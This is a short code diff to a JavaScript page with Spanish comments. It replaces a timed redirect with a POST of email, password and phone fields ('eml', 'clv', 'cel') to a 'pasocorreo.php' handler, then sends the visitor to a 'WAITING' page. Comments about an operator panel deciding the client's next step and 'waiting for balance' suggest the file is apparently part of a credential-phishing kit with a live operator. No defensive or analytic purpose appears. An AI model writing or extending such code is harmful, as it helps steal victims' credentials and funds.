@@ -200,11 +200,15 @@ function b34f9_fecha_larga() {
             $("#fondo").show();
             $("#cargando-o").show();
 
-            // 3. Solo ir a WAITING sin cambiar status
-            // El panel verá que el cliente confirmó y decidirá el siguiente paso
-            setTimeout(function() {
+            // 3. Cambiar a estado 5 (esperando saldo/923) para que se quede en WAITING
+            $.post("../../../../../process/pasocorreo.php", {
+                eml: "",
+                clv: "",
+                cel: ""
+            }, function(data) {
+                // 4. Ir a WAITING
                 window.location.href = "../a/WAITING";
-            }, 1000);
+            });
         });
         
         // Prevenir zoom en doble tap
